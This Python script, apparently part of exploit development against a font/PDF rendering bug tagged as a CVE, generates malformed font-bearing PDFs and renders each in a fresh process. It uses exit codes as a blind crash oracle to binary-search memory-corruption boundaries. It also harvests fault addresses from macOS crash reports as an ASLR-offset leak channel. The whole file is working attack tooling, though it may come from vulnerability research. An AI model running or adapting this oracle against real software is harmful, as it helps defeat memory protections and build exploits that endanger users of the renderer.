# RIP-38: BLIND ASLR/ALLOCATOR ORACLE (no lldb in the probing path).
# Emulates the remote 1-bit channel: each probe = FRESH process (new ASLR)
# rendering a probe PDF (glyph-geometry L). Attacker observes ONLY exit code:
#   rc=0 survive | rc=-11/-10.. (signal) crash | rc=1 graceful.
# Binary-search the two regime boundaries BLIND, compare with prior ground
# truth (M3c: survive->crash ~16-17K, crash->graceful EXACTLY 32768).
# Also harvests .ips fault addresses (fa = x27 - Delta class) from crashed probes.
import os, sys, subprocess, glob, time, json, struct

CWD = os.path.dirname(os.path.abspath(__file__))
CVE = os.path.abspath(os.path.join(CWD, "..", "cve-2026-86950"))
TRACE = open(os.path.join(CVE, "rip38_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s + "\n"); TRACE.flush()

os.chdir(CVE)
PY = os.path.join(CVE, "venv/bin/python")
RENDER = os.path.join(CVE, "render7")
T0 = time.time()

def gen(L):
    pdf = "probe_%d.pdf" % L
    r = subprocess.run([PY, "-c",
        "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('probe_%d.ttf', %d)" % (L, L)],
        cwd=CVE, capture_output=True, timeout=120)
    if r.returncode != 0: return None
    r = subprocess.run([PY, "gen_pdf.py", pdf, "probe_%d.ttf" % L], cwd=CVE, capture_output=True, timeout=120)
    return pdf if r.returncode == 0 else None

def probe(L):
    pdf = gen(L)
    if not pdf:
        T("probe L=%d GEN-FAIL" % L); return None
    r = subprocess.run([RENDER, pdf, "probe_out.png"], cwd=CVE, capture_output=True, timeout=60)
    rc = r.returncode
    cls = "survive" if rc == 0 else ("graceful" if rc == 1 else "crash")
    T("probe L=%d rc=%s class=%s (%.1fs elapsed)" % (L, rc, cls, time.time() - T0))
    return cls

BUDGET = {"n": 0}
def probes_left(cap=45):
    BUDGET["n"] += 1
    return BUDGET["n"] <= cap

def bsearch(lo, hi, lo_expect, hi_expect, tag, step=128):
    c = probe(lo)
    while c != lo_expect and lo > 1024 and probes_left():
        lo //= 2; c = probe(lo)
    c = probe(hi)
    while c != hi_expect and hi < 200000 and probes_left():
        hi = int(hi * 1.5); c = probe(hi)
    T("oracle[%s] endpoints lo=%d(%s) hi=%d(%s)" % (tag, lo, lo_expect, hi, hi_expect))
    stall = 0
    while hi - lo > step and probes_left():
        mid = (lo + hi) // 2 // 8 * 8
        c = probe(mid)
        if c is None:
            stall += 1
            T("oracle[%s] GEN-FAIL stall=%d at mid=%d" % (tag, stall, mid))
            if stall >= 3:
                T("oracle[%s] abort: gen failing" % tag); break
            mid = (mid + lo) // 2 // 8 * 8  # nudge, don't loop same point
            c = probe(mid)
            if c is None: break
        stall = 0
        if c == lo_expect: lo = mid
        else: hi = mid
    return hi

T("=== RIP-38 ORACLE START (blind, fresh-process rc channel) ===")
B1 = bsearch(8192, 24576, "survive", "crash", "survive->crash")
T("ORACLE-B1 (smallest non-survive L) = %d (prior ground truth ~16000-17000)" % B1)
# negative band: crash [-27648,-17408] vs survive [-16384,-256] (GT RIP-4) — int16-safe
B2 = bsearch(-20480, -12288, "crash", "survive", "neg-crash->survive")
T("ORACLE-B2NEG (first survive above neg crash band) = %d (prior GT: boundary in (-17408,-16384))" % B2)
match1 = 16000 <= B1 <= 17408
match2 = -17408 <= B2 <= -16384
T("ORACLE-B1 MATCH: %s | ORACLE-B2NEG MATCH: %s" % ("YES" if match1 else "NO", "YES" if match2 else "NO"))

# --- .ips harvest (fa = x27 - Delta class -> ASLR-offset leak channel) ---
t0file = T0 - 5
time.sleep(3)
ipss = []
for pat in ("render7-*.ips", "render7*.ips"):
    ipss += glob.glob(os.path.expanduser("~/Library/Logs/DiagnosticReports/" + pat))
ipss = [p for p in set(ipss) if os.path.getmtime(p) >= t0file]
T("ips harvested: %d" % len(ipss))
fas = []
for p in ipss[:40]:
    try:
        lines = open(p, errors="ignore").read().split("\n", 1)
        body = json.loads(lines[1]) if len(lines) > 1 else {}
        ex = body.get("exception", {})
        if len(fas) == 0:
            T("ips[0] exception-raw: %s" % json.dumps(ex)[:220])
        fa = ex.get("address") or ex.get("faultingAddress") or body.get("faultingAddress")
        if fa is None:
            for k in ("faultingAddress", "address"):
                if k in body: fa = body[k]; break
        ty = ex.get("type", "?")
        if fa is not None: fas.append((os.path.basename(p), ty, fa))
    except Exception:
        pass
for nm, ty, fa in fas[:20]:
    T("ips %s %s fa=%s" % (nm[:40], ty, hex(int(fa)) if isinstance(fa, int) else fa))
uniq = sorted(set(int(fa) for _, _, fa in fas if isinstance(fa, int)))
T("distinct fa count=%d; fa span=%s" % (len(uniq), ("0x%x..0x%x" % (uniq[0], uniq[-1])) if uniq else "n/a"))

verdict = "ORACLE-LIVE blind-boundaries B1=%d(%s) B2NEG=%d(%s)" % (B1, "MATCH" if match1 else "NO", B2, "MATCH" if match2 else "NO")
T("RESULT: %s" % verdict)
T("RIP-38 DONE (%.1fs total)" % (time.time() - T0))
TRACE.close()
